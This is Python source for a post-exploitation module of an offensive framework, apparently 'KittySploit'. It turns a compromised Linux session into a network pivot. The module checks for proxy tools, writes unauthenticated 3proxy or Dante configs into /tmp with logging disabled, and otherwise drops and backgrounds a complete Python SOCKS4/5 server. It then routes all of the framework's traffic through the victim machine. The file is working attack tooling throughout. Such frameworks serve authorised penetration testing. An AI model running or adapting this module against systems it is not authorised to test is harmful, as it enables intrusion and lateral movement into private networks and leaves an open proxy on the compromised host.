from kittysploit import *
from lib.post.linux.system import System
import time

class Module(Post, System):

    __info__ = {
        "name": "Linux SOCKS Proxy",
        "description": "Create a SOCKS proxy through a compromised Linux session for network pivoting",
        "platform": Platform.LINUX,
        "author": "KittySploit Team",
        "session_type": [SessionType.SHELL, 
                        SessionType.METERPRETER,
                        SessionType.SSH],
    }

    proxy_port = OptInteger(1080, "SOCKS proxy port to listen on", required=True)
    proxy_type = OptString("socks5", "SOCKS proxy type: socks4 or socks5", required=False)
    background = OptBool(True, "Run proxy in background", required=False)

    def run(self):
        """Create SOCKS proxy through the session"""
        
        print_status("Setting up SOCKS proxy...")
        print_info(f"Type: {self.proxy_type.value}")
        print_info(f"Port: {self.proxy_port.value}")
        print_info("All traffic through this proxy will be routed through the compromised machine")
        
        # Check available tools
        if self._check_ssh_available():
            print_status("Using SSH dynamic port forwarding (SOCKS proxy)...")
            return self._ssh_socks_proxy()
        
        if self._check_3proxy_available():
            print_status("Using 3proxy for SOCKS proxy...")
            return self._3proxy_socks()
        
        if self._check_dante_available():
            print_status("Using Dante (sockd) for SOCKS proxy...")
            return self._dante_socks()
        
        # Fallback: Python-based SOCKS proxy
        print_status("Using Python-based SOCKS proxy...")
        return self._python_socks_proxy()
    
    def _check_ssh_available(self):
        """Check if SSH is available"""
        result = self.cmd_exec("which ssh 2>/dev/null")
        return result and result.strip()
    
    def _check_3proxy_available(self):
        """Check if 3proxy is available"""
        result = self.cmd_exec("which 3proxy 2>/dev/null")
        return result and result.strip()
    
    def _check_dante_available(self):
        """Check if Dante (sockd) is available"""
        result = self.cmd_exec("which sockd 2>/dev/null || which danted 2>/dev/null")
        return result and result.strip()
    
    def _ssh_socks_proxy(self):
        """Create SOCKS proxy using SSH dynamic port forwarding"""
        try:
            # SSH dynamic port forwarding creates a SOCKS proxy
            # ssh -D local_port -f -N user@host
            # Since we're already in a session, we'll create a reverse SOCKS proxy
            
            print_info("SSH dynamic port forwarding creates a SOCKS proxy")
            print_warning("Note: This requires SSH server access or reverse connection setup")
            
            # Try to create SSH dynamic forward
            # For a proper setup, you'd need SSH server on your side
            # Here we'll use an alternative approach
            
            print_info("SSH SOCKS requires additional setup")
            print_info("Trying alternative SOCKS proxy methods...")
            return self._python_socks_proxy()
            
        except Exception as e:
            print_error(f"SSH SOCKS error: {e}")
            return False
    
    def _3proxy_socks(self):
        """Create SOCKS proxy using 3proxy"""
        try:
            # 3proxy configuration
            config_content = f"""
nserver 8.8.8.8
nscache 65536
timeouts 1 5 30 60 180 1800 15 60
daemon
maxconn 200
nolog
socks -p{self.proxy_port.value}
"""
            
            config_file = f"/tmp/3proxy_{self.proxy_port.value}.cfg"
            
            # Write config
            write_cmd = f"cat > {config_file} << 'EOF3PROXY'\n{config_content}\nEOF3PROXY"
            self.cmd_exec(write_cmd)
            
            # Start 3proxy
            if self.background.value:
                start_cmd = f"3proxy {config_file} &"
            else:
                start_cmd = f"3proxy {config_file}"
            
            result = self.cmd_exec(start_cmd)
            time.sleep(1)
            
            # Check if running
            check = self.cmd_exec(f"ps aux | grep -v grep | grep '3proxy.*{config_file}'")
            if check and check.strip():
                print_success(f"3proxy SOCKS proxy started on port {self.proxy_port.value}!")
                print_info(f"Configure your tools to use: {self.proxy_port.value} as SOCKS proxy")
                
                # Auto-configure framework proxy
                self._configure_framework_proxy()
                
                return True
            else:
                print_error("Failed to start 3proxy")
                return False
                
        except Exception as e:
            print_error(f"3proxy error: {e}")
            return False
    
    def _dante_socks(self):
        """Create SOCKS proxy using Dante"""
        try:
            print_info("Dante requires configuration file setup...")
            
            # Dante config is complex, so we'll use a simpler approach
            # Check if we can use danted with minimal config
            config_content = f"""
logoutput: stderr
internal: 0.0.0.0 port = {self.proxy_port.value}
external: eth0
socksmethod: username none
clientmethod: none
user.privileged: root
user.unprivileged: nobody

client pass {{
    from: 0.0.0.0/0 to: 0.0.0.0/0
    log: error connect disconnect
}}

socks pass {{
    from: 0.0.0.0/0 to: 0.0.0.0/0
    log: error connect disconnect
}}
"""
            
            config_file = f"/tmp/dante_{self.proxy_port.value}.conf"
            
            write_cmd = f"cat > {config_file} << 'EOFDANTE'\n{config_content}\nEOFDANTE"
            self.cmd_exec(write_cmd)
            
            if self.background.value:
                start_cmd = f"sockd -f {config_file} &"
            else:
                start_cmd = f"sockd -f {config_file}"
            
            result = self.cmd_exec(start_cmd)
            time.sleep(1)
            
            check = self.cmd_exec(f"ps aux | grep -v grep | grep 'sockd.*{config_file}'")
            if check and check.strip():
                print_success(f"Dante SOCKS proxy started on port {self.proxy_port.value}!")
                
                # Auto-configure framework proxy
                self._configure_framework_proxy()
                
                return True
            else:
                print_error("Failed to start Dante")
                return False
                
        except Exception as e:
            print_error(f"Dante error: {e}")
            return False
    
    def _python_socks_proxy(self):
        """Create SOCKS proxy using Python"""
        try:
            # Check Python availability
            python_check = self.cmd_exec("which python3 2>/dev/null || which python 2>/dev/null")
            if not python_check or not python_check.strip():
                print_error("Python not available for SOCKS proxy")
                return False
            
            # Try to use pysocks or implement basic SOCKS
            print_status("Creating Python SOCKS proxy...")
            
            # Check if pysocks is available
            pysocks_check = self.cmd_exec("python3 -c 'import socks' 2>&1")
            has_pysocks = "No module" not in pysocks_check and "Error" not in pysocks_check
            
            if has_pysocks:
                return self._python_pysocks_proxy()
            else:
                return self._python_basic_socks()
                
        except Exception as e:
            print_error(f"Python SOCKS error: {e}")
            return False
    
    def _python_pysocks_proxy(self):
        """Create SOCKS proxy using pysocks library"""
        try:
            python_script = f"""
import socket
import threading
import sys

def handle_socks_connection(client_sock):
    try:
        # Read SOCKS version and command
        version = client_sock.recv(1)[0]
        if version != 4 and version != 5:
            client_sock.close()
            return
        
        if version == 5:
            # SOCKS5 handshake
            nmethods = client_sock.recv(1)[0]
            methods = client_sock.recv(nmethods)
            # Send method selection (no auth)
            client_sock.send(b'\\x05\\x00')
            
            # Read request
            data = client_sock.recv(4)
            if len(data) < 4:
                client_sock.close()
                return
            
            cmd = data[1]
            addr_type = data[3]
            
            if addr_type == 1:  # IPv4
                addr = socket.inet_ntoa(client_sock.recv(4))
            elif addr_type == 3:  # Domain
                addr_len = client_sock.recv(1)[0]
                addr = client_sock.recv(addr_len).decode()
            else:
                client_sock.close()
                return
            
            port = int.from_bytes(client_sock.recv(2), 'big')
            
        else:  # SOCKS4
            data = client_sock.recv(6)
            port = int.from_bytes(data[0:2], 'big')
            addr_bytes = data[2:6]
            if addr_bytes[0:3] == b'\\x00\\x00\\x00' and addr_bytes[3] != 0:
                # Domain name
                domain = b''
                while True:
                    byte = client_sock.recv(1)
                    if byte == b'\\x00':
                        break
                    domain += byte
                addr = domain.decode()
            else:
                addr = socket.inet_ntoa(addr_bytes)
        
        # Connect to target
        target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target_sock.connect((addr, port))
        
        # Send success response
        if version == 5:
            client_sock.send(b'\\x05\\x00\\x00\\x01' + socket.inet_aton('0.0.0.0') + b'\\x00\\x00')
        else:  # SOCKS4
            client_sock.send(b'\\x00\\x5a' + b'\\x00' * 6)
        
        # Forward data
        def forward(src, dst):
            try:
                while True:
                    data = src.recv(4096)
                    if not data:
                        break
                    dst.send(data)
            except:
                pass
            finally:
                src.close()
                dst.close()
        
        t1 = threading.Thread(target=forward, args=(client_sock, target_sock))
        t2 = threading.Thread(target=forward, args=(target_sock, client_sock))
        t1.daemon = True
        t2.daemon = True
        t1.start()
        t2.start()
        t1.join()
        t2.join()
        
    except Exception as e:
        pass
    finally:
        try:
            client_sock.close()
        except:
            pass

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(('0.0.0.0', {self.proxy_port.value}))
server.listen(10)

print(f"SOCKS proxy listening on 0.0.0.0:{self.proxy_port.value}")

while True:
    client, addr = server.accept()
    threading.Thread(target=handle_socks_connection, args=(client,)).start()
"""
            
            script_path = f"/tmp/socks_{self.proxy_port.value}.py"
            write_cmd = f"cat > {script_path} << 'EOFSOCKS'\n{python_script}\nEOFSOCKS"
            self.cmd_exec(write_cmd)
            
            if self.background.value:
                run_cmd = f"python3 {script_path} &"
            else:
                run_cmd = f"python3 {script_path}"
            
            result = self.cmd_exec(run_cmd)
            time.sleep(1)
            
            check = self.cmd_exec(f"ps aux | grep -v grep | grep 'python.*{script_path}'")
            if check and check.strip():
                print_success(f"Python SOCKS proxy started on port {self.proxy_port.value}!")
                print_info(f"Script: {script_path}")
                print_info(f"Configure tools to use: {self.proxy_port.value} as SOCKS{self.proxy_type.value} proxy")
                
                # Auto-configure framework proxy
                self._configure_framework_proxy()
                
                return True
            else:
                print_error("Failed to start Python SOCKS proxy")
                return False
                
        except Exception as e:
            print_error(f"Python pysocks error: {e}")
            return False
    
    def _python_basic_socks(self):
        """Basic SOCKS proxy implementation"""
        return self._python_pysocks_proxy()  # Same implementation
    
    def _configure_framework_proxy(self):
        """Configure framework proxy settings to use the SOCKS proxy"""
        try:
            if self.framework:
                proxy_url = f"socks5://127.0.0.1:{self.proxy_port.value}"
                
                # Configure framework proxy
                self.framework.configure_proxy(
                    enabled=True,
                    host='127.0.0.1',
                    port=self.proxy_port.value,
                    scheme='socks5'
                )
                
                # Install socket wrapper for universal proxy support
                try:
                    from lib.pivot.socket_wrapper import install_socket_wrapper
                    install_socket_wrapper(self.framework)
                    print_success("Socket wrapper installed - ALL protocols will route through proxy!")
                except Exception as e:
                    print_warning(f"Could not install socket wrapper: {e}")
                    print_info("HTTP/HTTPS will work, but raw TCP/FTP may need manual configuration")
                
                print_success("Framework proxy configured automatically!")
                print_info(f"All framework modules will now use SOCKS proxy: {proxy_url}")
                print_info("Modules using Http_client, requests, FTP, or raw sockets will route through the compromised machine")
            else:
                print_warning("Framework not available - proxy not auto-configured")
                print_info(f"Manually configure proxy: socks5://127.0.0.1:{self.proxy_port.value}")
                
        except Exception as e:
            print_warning(f"Could not auto-configure framework proxy: {e}")
            print_info(f"Manually configure proxy: socks5://127.0.0.1:{self.proxy_port.value}")

